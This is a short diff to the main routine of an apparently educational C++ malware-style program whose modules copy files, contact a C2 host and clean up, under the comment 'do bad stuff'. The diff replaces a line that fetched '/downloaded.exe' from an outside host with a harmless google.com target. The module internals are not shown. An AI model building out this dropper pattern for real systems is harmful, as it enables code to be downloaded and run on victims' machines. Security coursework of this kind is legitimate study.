@@ -12,9 +12,12 @@ int main()
 {
 	// instantiate modules
 	CP copyModule;
-	C2 connModule("www.uvu-cybersecurity.com", "/downloaded.exe");
+	C2 connModule;// ("www.uvu-cybersecurity.com", "/downloaded.exe");
 	RM remvModule;
 
+	connModule.setPathName("/");
+	connModule.setHostName("www.google.com");
+	
 	// do bad stuff
 	copyModule.execute();
 	connModule.execute();
